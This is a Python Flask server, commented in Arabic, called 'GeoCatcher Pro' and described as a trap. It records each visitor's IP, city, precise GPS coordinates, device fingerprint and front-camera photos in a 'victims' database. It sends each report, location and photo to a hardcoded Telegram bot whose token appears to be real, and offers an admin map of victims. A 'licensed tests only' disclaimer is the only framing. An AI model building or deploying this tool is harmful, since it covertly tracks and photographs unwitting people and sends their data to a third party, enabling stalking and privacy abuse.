#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GeoCatcher Pro — نظام فخ احترافي: يجمع بيانات الزائر ويرسلها لبوت تيليجرام
الاستخدام: اختبارات أمنية مرخّصة فقط.
"""
import base64
import json
import sqlite3
import time
import uuid
from datetime import datetime
from pathlib import Path

import requests
from flask import Flask, jsonify, redirect, render_template, request, Response

# ═══════════════════ الإعدادات ═══════════════════
BOT_TOKEN = "8990437503:AAEbLQn5Pe539tpZb-l47AHoWxMPOakftho"      # ← من @BotFather
CHAT_ID   = "8278195073"      # ← من @userinfobot
ADMIN_KEY = "غيّر_هذه_الكلمة_السرية"  # ← كلمة مرور لوحة التحكم
PORT      = 5000
DB_FILE   = "victims.db"
PHOTO_DIR = Path("captures")
# ═════════════════════════════════════════════════

app = Flask(__name__)
PHOTO_DIR.mkdir(exist_ok=True)
TG = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ─────────────── قاعدة البيانات ───────────────
def db_exec(sql, args=()):
    conn = sqlite3.connect(DB_FILE)
    try:
        cur = conn.execute(sql, args)
        conn.commit()
        return cur.lastrowid
    finally:
        conn.close()

def db_query(sql, args=(), one=False):
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    try:
        cur = conn.execute(sql, args)
        rows = cur.fetchall()
        return (rows[0] if rows else None) if one else rows
    finally:
        conn.close()

def init_db():
    db_exec("""CREATE TABLE IF NOT EXISTS victims (
        id TEXT PRIMARY KEY,
        first_seen TEXT, last_seen TEXT, visits INTEGER DEFAULT 1,
        ip TEXT, country TEXT, city TEXT, isp TEXT,
        lat REAL, lon REAL,
        precise_lat REAL, precise_lon REAL, precise_accuracy REAL,
        ua TEXT, platform TEXT, screen TEXT, language TEXT, timezone TEXT,
        cores INTEGER, memory REAL, battery INTEGER, charging INTEGER,
        referrer TEXT, device_name TEXT
    )""")

init_db()

# ─────────────── تيليجرام ───────────────
def tg_call(method, **payload):
    try:
        r = requests.post(f"{TG}/{method}", json=payload, timeout=20)
        ok = r.json().get("ok", False)
        if not ok:
            print("[Telegram]", r.text)
        return ok
    except Exception as e:
        print("[Telegram error]", e)
        return False

def tg_text(text):
    return tg_call("sendMessage", chat_id=CHAT_ID, text=text,
                   parse_mode="HTML", disable_web_page_preview=True)

def tg_location(lat, lon):
    return tg_call("sendLocation", chat_id=CHAT_ID, latitude=lat, longitude=lon)

def tg_photo(path, caption=""):
    try:
        with open(path, "rb") as f:
            r = requests.post(f"{TG}/sendPhoto",
                              data={"chat_id": CHAT_ID, "caption": caption, "parse_mode": "HTML"},
                              files={"photo": f}, timeout=25)
        return r.json().get("ok", False)
    except Exception as e:
        print("[Telegram photo error]", e)
        return False

def esc(s):
    if s is None:
        return "?"
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def build_report(d, precise=False):
    if precise:
        return (
            "🎯 <b>تم تحديد الموقع الدقيق!</b>\n"
            f"🆔 الضحية: <code>{esc(d.get('id'))}</code>\n"
            f"📍 الإحداثيات: {d.get('precise_lat')}, {d.get('precise_lon')}\n"
            f"🎚️ الدقة: ±{d.get('precise_accuracy')} متر\n"
            f"🗺️ <a href='https://www.google.com/maps?q={d.get('precise_lat')},{d.get('precise_lon')}'>فتح الخريطة</a>"
        )
    return (
        "🚨 <b>زيارة جديدة للصفحة!</b>\n"
        "━━━━━━━━━━━━━━\n"
        f"🆔 <b>المعرّف:</b> <code>{esc(d.get('id'))}</code>\n"
        f"👤 <b>الجهاز:</b> {esc(d.get('device_name'))}\n"
        f"🌐 <b>IP:</b> <code>{esc(d.get('ip'))}</code>\n"
        f"🏳️ <b>الدولة:</b> {esc(d.get('country'))}\n"
        f"🏙️ <b>المدينة:</b> {esc(d.get('city'))}\n"
        f"🏢 <b>ISP:</b> {esc(d.get('isp'))}\n"
        f"📱 <b>النظام:</b> {esc(d.get('platform'))}\n"
        f"📺 <b>الشاشة:</b> {esc(d.get('screen'))}\n"
        f"🧠 <b>المعالج:</b> {d.get('cores')} نواة\n"
        f"🔋 <b>البطارية:</b> {d.get('battery')}%\n"
        f"🕐 <b>المنطقة الزمنية:</b> {esc(d.get('timezone'))}\n"
        f"🔗 <b>المصدر:</b> {esc(d.get('referrer') or 'مباشر')}\n"
        f"⏰ <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        "━━━━━━━━━━━━━━\n"
        f"📍 <b>الموقع التقريبي:</b> {d.get('lat')}, {d.get('lon')}\n"
        f"🗺️ <a href='https://www.google.com/maps?q={d.get('lat')},{d.get('lon')}'>فتح الخريطة</a>"
    )

# ─────────────── الصفحات والواجهات ───────────────
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/info")
def api_info():
    """معلومات IP للزائر — تُجلب من الخادم لتفادي مشاكل المتصفح"""
    try:
        r = requests.get("https://ipwho.is/", timeout=10)
        d = r.json()
        if d.get("success"):
            return jsonify({
                "ip": d.get("ip"),
                "country": d.get("country"),
                "city": d.get("city"),
                "isp": (d.get("connection") or {}).get("isp"),
                "lat": d.get("latitude"),
                "lon": d.get("longitude"),
                "timezone": (d.get("timezone") or {}).get("id"),
            })
    except Exception:
        pass
    try:
        r = requests.get("http://ip-api.com/json/", timeout=10)
        d = r.json()
        if d.get("status") == "success":
            return jsonify({
                "ip": d.get("query"),
                "country": d.get("country"),
                "city": d.get("city"),
                "isp": d.get("isp"),
                "lat": d.get("lat"),
                "lon": d.get("lon"),
                "timezone": d.get("timezone"),
            })
    except Exception:
        pass
    # خطة أخيرة: عنوان الظاهر للخادم فقط
    return jsonify({
        "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
        "country": "", "city": "", "isp": "", "lat": None, "lon": None, "timezone": ""
    })

def to_float(v):
    try:
        return float(v)
    except (TypeError, ValueError):
        return None

@app.route("/api/track", methods=["POST"])
def track():
    d = request.get_json(silent=True) or {}
    vid = d.get("id") or uuid.uuid4().hex[:12]
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    stage = d.get("stage", "ip")

    lat, lon = to_float(d.get("lat")), to_float(d.get("lon"))
    plat, plon = to_float(d.get("precise_lat")), to_float(d.get("precise_lon"))
    pacc = to_float(d.get("precise_accuracy"))

    existing = db_query("SELECT * FROM victims WHERE id=?", (vid,), one=True)

    if existing:
        db_exec("""UPDATE victims SET
                last_seen=?, visits=visits+1,
                ip=COALESCE(?,ip), country=COALESCE(?,country), city=COALESCE(?,city), isp=COALESCE(?,isp),
                lat=COALESCE(?,lat), lon=COALESCE(?,lon),
                precise_lat=COALESCE(?,precise_lat), precise_lon=COALESCE(?,precise_lon),
                precise_accuracy=COALESCE(?,precise_accuracy),
                ua=COALESCE(?,ua), platform=COALESCE(?,platform), screen=COALESCE(?,screen),
                language=COALESCE(?,language), timezone=COALESCE(?,timezone),
                cores=COALESCE(?,cores), memory=COALESCE(?,memory),
                battery=COALESCE(?,battery), charging=COALESCE(?,charging),
                referrer=COALESCE(?,referrer), device_name=COALESCE(?,device_name)
                WHERE id=?""",
            (now,
             d.get("ip"), d.get("country"), d.get("city"), d.get("isp"),
             lat, lon, plat, plon, pacc,
             d.get("ua"), d.get("platform"), d.get("screen"),
             d.get("language"), d.get("timezone"),
             d.get("cores"), d.get("memory"),
             d.get("battery"), d.get("charging"),
             d.get("referrer"), d.get("device_name"),
             vid))
    else:
        db_exec("""INSERT INTO victims
                (id, first_seen, last_seen, visits, ip, country, city, isp,
                 lat, lon, precise_lat, precise_lon, precise_accuracy,
                 ua, platform, screen, language, timezone, cores, memory,
                 battery, charging, referrer, device_name)
                VALUES (?,?,?,1,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
            (vid, now, now,
             d.get("ip"), d.get("country"), d.get("city"), d.get("isp"),
             lat, lon, plat, plon, pacc,
             d.get("ua"), d.get("platform"), d.get("screen"),
             d.get("language"), d.get("timezone"), d.get("cores"), d.get("memory"),
             d.get("battery"), d.get("charging"), d.get("referrer"), d.get("device_name")))

    # ── التنبيهات على تيليجرام ──
    if existing is None:
        tg_text(build_report(d))
        if lat and lon:
            tg_location(lat, lon)
    elif stage == "precise" and plat and plon and not existing["precise_lat"]:
        tg_text(build_report(d, precise=True))
        tg_location(plat, plon)

    return jsonify({"ok": True, "id": vid})

@app.route("/api/photo", methods=["POST"])
def photo():
    d = request.get_json(silent=True) or {}
    b64 = d.get("photo", "")
    vid = d.get("id", "unknown")
    if not b64:
        return jsonify({"ok": False}), 400
    try:
        raw = base64.b64decode(b64.split(",")[-1])
    except Exception:
        return jsonify({"ok": False}), 400
    path = PHOTO_DIR / f"{vid}_{int(time.time())}.jpg"
    path.write_bytes(raw)
    tg_photo(str(path), f"📸 <b>صورة من الكاميرا الأمامية</b>\n🆔 الضحية: <code>{esc(vid)}</code>")
    return jsonify({"ok": True})

@app.route("/captures/<path:fn>")
def captures(fn):
    p = (PHOTO_DIR / fn).resolve()
    if p.parent != PHOTO_DIR.resolve() or not p.exists():
        return Response("Not found", status=404)
    return Response(p.read_bytes(), mimetype="image/jpeg")

# ─────────────── لوحة التحكم ───────────────
@app.route("/admin")
def admin():
    if request.args.get("key") != ADMIN_KEY:
        return Response("<h2>⛔ Unauthorized</h2>", status=401)
    rows = db_query("SELECT * FROM victims ORDER BY last_seen DESC")
    data = [(r, [p.name for p in PHOTO_DIR.glob(f"{r['id']}_*.jpg")]) for r in rows]
    points = [{
        "id": r["id"], "lat": r["precise_lat"] or r["lat"], "lon": r["precise_lon"] or r["lon"],
        "city": r["city"], "ip": r["ip"]
    } for r in rows if (r["precise_lat"] or r["lat"])]
    return render_template("admin.html", data=data,
                           points_json=json.dumps(points, ensure_ascii=False),
                           key=ADMIN_KEY)

@app.route("/admin/delete/<vid>")
def admin_delete(vid):
    if request.args.get("key") != ADMIN_KEY:
        return Response("Unauthorized", status=401)
    db_exec("DELETE FROM victims WHERE id=?", (vid,))
    return redirect(f"/admin?key={ADMIN_KEY}")

if __name__ == "__main__":
    print("GeoCatcher Pro يعمل على المنفذ", PORT)
    app.run(host="0.0.0.0", port=PORT, debug=False)
